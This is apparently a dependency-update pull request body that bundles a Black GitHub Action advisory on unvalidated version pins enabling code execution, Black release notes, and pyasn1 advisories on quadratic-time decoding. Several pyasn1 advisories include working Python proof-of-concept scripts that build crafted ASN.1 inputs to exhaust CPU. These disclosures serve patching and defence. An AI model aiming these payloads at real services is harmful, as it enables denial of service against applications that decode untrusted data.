| [black](https://redirect.github.com/psf/black) ([changelog](https://redirect.github.com/psf/black/blob/main/CHANGES.md)) | `26.5.1` → `26.10.1` | ![age](https://developer.mend.io/api/mc/badges/age/pypi/black/26.10.1?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/pypi/black/26.5.1/26.10.1?slim=true) |

---

### Black: GitHub Action installs unvalidated required-version from pyproject.toml
[CVE-2026-114134](https://nvd.nist.gov/vuln/detail/CVE-2026-114134) / [GHSA-cg8m-r9f2-5wm2](https://redirect.github.com/advisories/GHSA-cg8m-r9f2-5wm2)

<details>
<summary>More information</summary>

#### Details
##### Summary

The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.

##### Details

This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.

##### Proof of concept

Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.

##### Impact

This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

#### Severity
- CVSS Score: 8.7 / 10 (High)
- Vector String: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

#### References
- [https://github.com/psf/black/security/advisories/GHSA-cg8m-r9f2-5wm2](https://redirect.github.com/psf/black/security/advisories/GHSA-cg8m-r9f2-5wm2)
- [https://github.com/psf/black/pull/5510](https://redirect.github.com/psf/black/pull/5510)
- [https://github.com/psf/black/commit/ac1f71563aeccf73cf13ece00f231d9d6c66a514](https://redirect.github.com/psf/black/commit/ac1f71563aeccf73cf13ece00f231d9d6c66a514)
- [https://github.com/psf/black/releases/tag/26.10.1](https://redirect.github.com/psf/black/releases/tag/26.10.1)
- [https://github.com/advisories/GHSA-cg8m-r9f2-5wm2](https://redirect.github.com/advisories/GHSA-cg8m-r9f2-5wm2)

This data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-cg8m-r9f2-5wm2) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).
</details>

---

### Release Notes

<details>
<summary>psf/black (black)</summary>

### [`v26.10.1`](https://redirect.github.com/psf/black/blob/HEAD/CHANGES.md#Version-26101)

[Compare Source](https://redirect.github.com/psf/black/compare/26.10.0...26.10.1)

##### Highlights

This release fixes a security issue in Black's bundled GitHub Action. Repositories that
use the action are encouraged to update to the latest version of Black immediately. This
update is received automatically when using `psf/black@stable`, and is independent of
the version of Black installed by the action.

When the GitHub Action reads version specifiers from `tool.black.required-version`, it
now only accepts released versions of Black, as it already did for `black` requirements
in dependency lists. Other values, such as URL references, are now rejected. This issue
has been registered as `GHSA-cg8m-r9f2-5wm2`; a CVE identifier is pending.

##### Stable style

- Fix a long Jupyter notebook assignment magic (for example `x = !ls -la`) being wrapped
  in parentheses, which IPython can no longer run; such cells are now left unchanged
  ([#​5481](https://redirect.github.com/psf/black/issues/5481))
- Keep repeated lines outside the selected `--line-ranges` unchanged ([#​5436](https://redirect.github.com/psf/black/issues/5436))
- Fix `--line-ranges` formatting lines that follow a statement when formatting joins or
  re-indents that statement ([#​5484](https://redirect.github.com/psf/black/issues/5484))
- Fix `--line-ranges` crashing with an internal error when an unselected statement has a
  `# fmt: skip` comment on the last line before a closing bracket ([#​5477](https://redirect.github.com/psf/black/issues/5477))
- Prevent moving an encoding declaration (for example `# -*- coding: latin-1 -*-`) onto
  the first two lines of a file ([#​5487](https://redirect.github.com/psf/black/issues/5487))
- Fix adding an extra trailing blank line inside a multi-line module docstring when its
  last line is near the line length limit ([#​5494](https://redirect.github.com/psf/black/issues/5494))
- Preserve blank lines between imports and unselected statements when using
  `--line-ranges`, and ensure a blank line is added between an unselected import and a
  newly formatted statement ([#​5493](https://redirect.github.com/psf/black/issues/5493), [#​5649](https://redirect.github.com/psf/black/issues/5649))
- Keep the parentheses around a walrus that is the only item in a set (for example
  `{(x := f())}`) when targeting Python 3.9 or older, since Python 3.8 and 3.9.0 can't
  parse it without them ([#​5502](https://redirect.github.com/psf/black/issues/5502))

##### Preview style

- Do not split short expressions on delimiters (such as binary operators, comparisons,
  or comprehensions) inside brackets when preceded by a standalone comment ([#​5455](https://redirect.github.com/psf/black/issues/5455))
- Fix the unstable `string_processing` feature removing backslash-newline sequences from
  raw strings, which changed their value ([#​5482](https://redirect.github.com/psf/black/issues/5482))
- Avoid adding unnecessary parentheses around unbreakable right-hand side expressions in
  assignments (such as annotated assignments or subscript targets) ([#​5473](https://redirect.github.com/psf/black/issues/5473))
- Parenthesize expressions with parameter comments when they exceed the line length
  under `--preview` ([#​5442](https://redirect.github.com/psf/black/issues/5442))
- Fix `wrap_long_dict_values_in_parens` dropping the parentheses around a right-hand
  side that contains a dictionary, leaving a line over the length limit ([#​5492](https://redirect.github.com/psf/black/issues/5492))
- Fix the unstable `string_processing` feature adding a space after `*` or `**` in a PEP
  695 type parameter (`* Ts = ...`) when it splits a string in the parameter's default
  ([#​5504](https://redirect.github.com/psf/black/issues/5504))
- Avoid unnecessary line splits of trailers (such as indexing/subscripts) when an
  earlier bracket split exceeds the line length only due to a trailing comment ([#​5498](https://redirect.github.com/psf/black/issues/5498))

##### Configuration

- Add `--cache-dir` to configure the cache directory from the command line ([#​5433](https://redirect.github.com/psf/black/issues/5433))
- Don't cache a file as formatted after formatting or checking it with `--line-ranges`,
  which made a later full `black --check` pass and `black` skip the unformatted lines
  ([#​5476](https://redirect.github.com/psf/black/issues/5476))
- Respect a `.gitignore` that starts with a UTF-8 byte order mark. The mark became part
  of the first pattern, so that pattern never matched and Black formatted files that git
  ignores ([#​5497](https://redirect.github.com/psf/black/issues/5497))

##### Performance

- Avoid quadratic runtime when splitting very long lines with many trailing bracket
  pairs (such as consecutive subscripts) ([#​5475](https://redirect.github.com/psf/black/issues/5475))

##### Integrations

- Fix the GitHub Action crashing on dependency-group includes when `use_pyproject` is
  enabled ([#​5479](https://redirect.github.com/psf/black/issues/5479))
- When the GitHub Action reads version specifiers from `tool.black.required-version`, it
  now only accepts released versions of Black, as it already did for `black`
  requirements in dependency lists. Other values, such as URL references, are now
  rejected. ([#​5510](https://redirect.github.com/psf/black/issues/5510))

### [`v26.10.0`](https://redirect.github.com/psf/black/blob/HEAD/CHANGES.md#Version-26100)

[Compare Source](https://redirect.github.com/psf/black/compare/26.5.1...26.10.0)

##### Stable style

- `--line-ranges` no longer inserts an empty line after a docstring when the range
  covers only the docstring itself ([#​5312](https://redirect.github.com/psf/black/issues/5312))
- Fix `# fmt: skip` on a bracketed ternary turning the surrounding tuple into a call
  ([#​5464](https://redirect.github.com/psf/black/issues/5464))
- Fix crash when `# fmt: skip` is placed on a one-line function or class with PEP 695
  type parameters ([#​5429](https://redirect.github.com/psf/black/issues/5429))
- Fix an inline comment after the closing bracket of optional parentheses being moved
  inside the parentheses when the parenthesized expression contains own-line comments
  ([#​5395](https://redirect.github.com/psf/black/issues/5395))
- Fix unparseable output when `# fmt: skip` is placed on a bracket of an `if`, `while`,
  `for`, or `with` header ([#​5401](https://redirect.github.com/psf/black/issues/5401), [#​5405](https://redirect.github.com/psf/black/issues/5405))
- Fix crash when formatting parenthesized expressions with multiple inline comments and
  `# fmt: skip` ([#​5414](https://redirect.github.com/psf/black/issues/5414))
- Fix parsing Jupyter notebook assignment magics when non-ASCII characters appear
  earlier on the line ([#​5381](https://redirect.github.com/psf/black/issues/5381))
- Preserve blank lines that come immediately before a `# fmt: on` comment ([#​5300](https://redirect.github.com/psf/black/issues/5300))
- Keep the parentheses around the target of an annotated assignment (e.g.
  `(x): int = 5`), which prevent CPython from including the name in `__annotations__`
  ([#​5321](https://redirect.github.com/psf/black/issues/5321))
- Stop treating a t-string in docstring position as a docstring (e.g. `t"  spam  "` as
  the first statement of a module, class or function) ([#​5287](https://redirect.github.com/psf/black/issues/5287))
- Fix unparseable output for a t-string whose replacement field contains a quote (e.g.
  `t'\'{a["b"]}\''`) ([#​5265](https://redirect.github.com/psf/black/issues/5265))
- Fix unparseable output for a triple-quoted string whose body ends in an
  already-escaped double quote (e.g. `'''\'''\"'''`) ([#​5262](https://redirect.github.com/psf/black/issues/5262))
- Fix `--skip-magic-trailing-comma` dropping the trailing comma from a split
  single-element tuple used as a lambda parameter default ([#​5246](https://redirect.github.com/psf/black/issues/5246))
- Fix unstable formatting when an inline comment sits on optional parentheses (e.g. a
  parenthesized assert message) ([#​5241](https://redirect.github.com/psf/black/issues/5241))
- Fix `--skip-magic-trailing-comma` dropping the trailing comma of a one-element
  subscript (`a[x,]`) when the line is long enough to be split and contains a power
  operator ([#​5272](https://redirect.github.com/psf/black/issues/5272))
- Fix crash when a standalone comment sits between tokens of a comprehension or lambda
  ([#​5144](https://redirect.github.com/psf/black/issues/5144))
- Fix inline comments on a bracket inside a comprehension being dropped ([#​5330](https://redirect.github.com/psf/black/issues/5330))
- Respect the magic trailing comma in a PEP 695 type parameter list containing a
  `*TypeVarTuple` or `**ParamSpec` ([#​5244](https://redirect.github.com/psf/black/issues/5244))
- Fix crash when a comment-only `# fmt: off`/`# fmt: on` block is followed by a `with`
  statement after another standalone comment ([#​5189](https://redirect.github.com/psf/black/issues/5189))
- Fix a crash when splitting `case case if ...` match patterns at very small line
  lengths ([#​5147](https://redirect.github.com/psf/black/issues/5147))
- Fix multiline docstring indentation when leading tabs are used inside indented
  docstrings ([#​5148](https://redirect.github.com/psf/black/issues/5148))
- Respect `# fmt: skip` on a line that opens a bracket (e.g.
  `from x import (  # fmt: skip`) when a standalone comment is among the bracket's
  contents ([#​5161](https://redirect.github.com/psf/black/issues/5161))
- Fix an AST safety error when separate `# type: ignore` comments in a parenthesized
  attribute chain were merged onto one physical line ([#​5297](https://redirect.github.com/psf/black/issues/5297))
- Preserve comments and blank lines outside requested ranges when formatting with
  `--line-ranges` ([#​5175](https://redirect.github.com/psf/black/issues/5175))
- Fix crash when `# fmt: skip` is used on one-line `async def`, `async with`, and
  `async for` statements containing a semicolon ([#​5311](https://redirect.github.com/psf/black/issues/5311))
- Stop converting form feeds or other similar characters in docstrings into newlines
  ([#​5461](https://redirect.github.com/psf/black/issues/5461))
- Fix `--skip-source-first-line` turning the skipped line's CRLF ending into `\r\r\n`
  when reformatting a file with CRLF line endings ([#​5438](https://redirect.github.com/psf/black/issues/5438))

##### Preview style

##### New preview features

- Add missing blank lines after classes whose last method has an ellipsis body ([#​5439](https://redirect.github.com/psf/black/issues/5439))
- Split only the brackets holding a magic trailing comma when more trailers follow them
  (e.g. stop splitting inside the `[2]` of `[1,][2](3)`) ([#​5448](https://redirect.github.com/psf/black/issues/5448))
- Keep dictionary keys containing operators together on one line when the value can be
  wrapped onto a new line instead ([#​5435](https://redirect.github.com/psf/black/issues/5435))
- Remove redundant parentheses around individual variables in unpacking targets (e.g.
  `for (x), (y) in points:` becomes `for x, y in points:`) ([#​5416](https://redirect.github.com/psf/black/issues/5416))
- Normalize uppercase `T` prefixes on t-strings to lowercase ([#​5425](https://redirect.github.com/psf/black/issues/5425))
- Remove redundant parentheses around generator expressions ([#​5304](https://redirect.github.com/psf/black/issues/5304), [#​5369](https://redirect.github.com/psf/black/issues/5369))
- Preserve two blank lines before a top-level class starting inside a `# fmt: off` block
  after an import ([#​5238](https://redirect.github.com/psf/black/issues/5238))
- Fix unnecessary parentheses around short right-hand expressions in indexed assignments
  (e.g. `x[key] = expr`) ([#​5095](https://redirect.github.com/psf/black/issues/5095))
- Parenthesize tuple expressions in `yield` statements for consistency with function
  calls and returns ([#​5170](https://redirect.github.com/psf/black/issues/5170))
- Stop splitting between a variable and its operator (`not in`, `==`, `is`, ...) when
  the right-hand side is a bracketed expression, and instead split inside the brackets
  ([#​5135](https://redirect.github.com/psf/black/issues/5135))
- In `.pyi` stub files, enforce a blank line after a function or method that has a
  docstring-only body when another comment or statement follows it ([#​5158](https://redirect.github.com/psf/black/issues/5158))

##### Updates to existing preview features

- Fix crash in stub files when `# fmt: skip` is placed on a function in a group of
  same-name decorated functions (e.g. `@overload`s or a property setter) ([#​5430](https://redirect.github.com/psf/black/issues/5430))
- Keep the parentheses around a lambda used as the iterable of a comprehension (e.g.
  `[x for x in (lambda: 0) if x]`) ([#​5176](https://redirect.github.com/psf/black/issues/5176), [#​5200](https://redirect.github.com/psf/black/issues/5200))

##### Updates to existing unstable features

- Do not treat multi-line expressions with merged strings and trailing `# type: ignore`
  comments as single-line unsplittable expressions ([#​5466](https://redirect.github.com/psf/black/issues/5466))
- Fix duplicated inline comment when stripping the parentheses around a string or
  merging a backslash-continued string on the same line ([#​5449](https://redirect.github.com/psf/black/issues/5449))
- Split long stringified return annotations even when the function has parameters
  ([#​5427](https://redirect.github.com/psf/black/issues/5427))

### pyasn1 has quadratic CPU use in schemaless BER/CER/DER container decoding
[CVE-2026-119194](https://nvd.nist.gov/vuln/detail/CVE-2026-119194) / [GHSA-fm9c-5rcf-2q5p](https://redirect.github.com/advisories/GHSA-fm9c-5rcf-2q5p)

<details>
<summary>More information</summary>

#### Details
##### Summary

When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.

##### Details

ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.

##### Proof of concept

Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:

```python
import sys
import time

from pyasn1.codec.ber import decoder
from pyasn1.type import univ

def enc_tag(tag_id):
    groups = [tag_id & 0x7f]
    tag_id >>= 7
    while tag_id:
        groups.append((tag_id & 0x7f) | 0x80)
        tag_id >>= 7
    return b'\xbf' + bytes(reversed(groups))

def payload(tag_ids):
    body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'
                    for tag_id in tag_ids)
    length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')
    return b'\x30' + bytes([0x80 | len(length)]) + length + body

for count in (3200, 6400):
    cases = (
        ("collision", [32 + i * sys.hash_info.modulus
                       for i in range(count)]),
        ("control", [(1 << 70) + i for i in range(count)]),
    )
    for name, tag_ids in cases:
        wire = payload(tag_ids)
        start = time.process_time()
        value, remainder = decoder.decode(wire)
        cpu_seconds = time.process_time() - start

        assert type(value) is univ.Sequence
        assert len(value) == count and remainder == b''
        for position, tag_id in enumerate(tag_ids):
            component = value.getComponentByPosition(position)
            assert component.asOctets() == b'A'
            assert component.tagSet[-1].tagId == tag_id

        print(count, name, len(wire), round(cpu_seconds, 3))
```

##### Impact

Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

#### References

- [https://nvd.nist.gov/vuln/detail/CVE-2026-119194](https://nvd.nist.gov/vuln/detail/CVE-2026-119194)
- [https://github.com/pyasn1/pyasn1/pull/132](https://redirect.github.com/pyasn1/pyasn1/pull/132)

- [https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5](https://redirect.github.com/pyasn1/pyasn1/releases/tag/v0.6.5)

### pyasn1 has quadratic-time denial of service in constructed string and indefinite-length ANY decoding
[CVE-2026-119195](https://nvd.nist.gov/vuln/detail/CVE-2026-119195) / [GHSA-9m75-vc3g-4x39](https://redirect.github.com/advisories/GHSA-9m75-vc3g-4x39)

<details>
<summary>More information</summary>

#### Details
##### Summary

In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.

The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.

This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://redirect.github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.

##### Technical details

In the [v0.6.4 BER decoder](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).

The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.

The [DER decoder's OCTET STRING restriction](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.

The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.

The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.

##### Impact

If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.

##### Severity assessment (CVSS v3.1)

The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).

On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.

| Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU |
| --- | ---: | ---: | ---: |
| BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s |
| BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s |
| BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s |
| BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s |
| BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s |
| BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s |
| CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s |
| CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s |
| CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |

For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.

##### Reproduction

This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.

```python
import time

from pyasn1.codec.ber import decoder as ber
from pyasn1.codec.cer import decoder as cer
from pyasn1.codec.der import decoder as der
from pyasn1.type import univ

def tlv(identifier, contents):
    length = len(contents)
    if length < 128:
        return bytes((identifier, length)) + contents
    encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes((identifier, 0x80 | len(encoded))) + encoded + contents

def measure(label, decode, substrate, asn1Spec=None):
    start = time.process_time()
    _, rest = decode(substrate, asn1Spec=asn1Spec)
    assert not rest
    print(f"{label}: {len(substrate)} input bytes, "
          f"{time.process_time() - start:.3f} CPU seconds")

n = 100_000
octet_fragments = b"\x04\x02AA" * n
utf8_fragments = b"\x0c\x02AA" * n

measure("BER constructed OCTET STRING", ber.decode,
        tlv(0x24, octet_fragments))
measure("BER indefinite ANY", ber.decode,
        b"\x30\x80" + b"\x04\x01A" * n + b"\x00\x00",
        univ.Any())

##### CER uses indefinite length and 1,000-content-octet primitive fragments.
cer_fragment = tlv(0x04, b"A" * 1000)
measure("CER constructed OCTET STRING", cer.decode,
        b"\x24\x80" + cer_fragment * 1000 + b"\x00\x00")

##### These constructed encodings are accepted by pyasn1 but are invalid DER.
measure("DER OCTET STRING with schema", der.decode,
        tlv(0x24, octet_fragments), univ.OctetString())
measure("DER UTF8String without schema", der.decode,
        tlv(0x2c, utf8_fragments))
```

##### Patch

pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.

##### Workaround

Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.

##### Credits and references

Reported by [alimony](https://redirect.github.com/alimony). Independently reported by [manus-pi](https://redirect.github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.

- [pyasn1 v0.6.4 affected decoder source](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py)
- [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en)
- [CVE-2026-59885, separate OID decoder issue](https://redirect.github.com/advisories/GHSA-8ppf-4f7h-5ppj)

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

### pyasn1 has quadratic-complexity denial of service in binary REAL decoding
[CVE-2026-119197](https://nvd.nist.gov/vuln/detail/CVE-2026-119197) / [GHSA-mm57-4v3p-rchx](https://redirect.github.com/advisories/GHSA-mm57-4v3p-rchx)

<details>
<summary>More information</summary>

#### Details
##### Summary

In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.

This is distinct from [CVE-2026-59886](https://redirect.github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.

##### Root cause and affected components

For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:

```python
p = 0
while chunk:
    p <<= 8
    p |= chunk[0]
    chunk = chunk[1:]
```

Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://redirect.github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.

The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.

##### Impact

A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.

##### Reproduction and evidence

The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.

```python
import time

from pyasn1.codec.ber import decoder as ber
from pyasn1.codec.cer import decoder as cer
from pyasn1.codec.der import decoder as der

def real_value(mantissa_octets):
    content = b"\x80\x00" + b"\xff" * mantissa_octets
    length = len(content).to_bytes(3, "big")
    return b"\x09\x83" + length + content

for codec in (ber, cer, der):
    for size in (50_000, 100_000, 200_000):
        substrate = real_value(size)
        started = time.process_time()
        value, rest = codec.decode(substrate)
        print(codec.__name__, size, time.process_time() - started)
        assert not rest
        assert tuple(value)[1:] == (2, 0)
```

The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.

| Mantissa size | Reporter's BER CPU time |
| ---: | ---: |
| 50,000 octets | 0.328 s |
| 100,000 octets | 1.299 s |
| 200,000 octets | 6.043 s |
| 400,000 octets | 24.095 s |

The same report measured 5.645 s for a 200,000-octet mantissa through DER.

A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.

##### Fix

pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.

##### Workarounds

Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

- [https://nvd.nist.gov/vuln/detail/CVE-2026-119197](https://nvd.nist.gov/vuln/detail/CVE-2026-119197)
- [https://github.com/pyasn1/pyasn1/pull/132](https://redirect.github.com/pyasn1/pyasn1/pull/132)

### pyasn1 has quadratic CPU consumption in constructed BIT STRING decoding
[CVE-2026-119196](https://nvd.nist.gov/vuln/detail/CVE-2026-119196) / [GHSA-2qm8-x737-gmw5](https://redirect.github.com/advisories/GHSA-2qm8-x737-gmw5)

<details>
<summary>More information</summary>

#### Details
##### Summary

In pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.

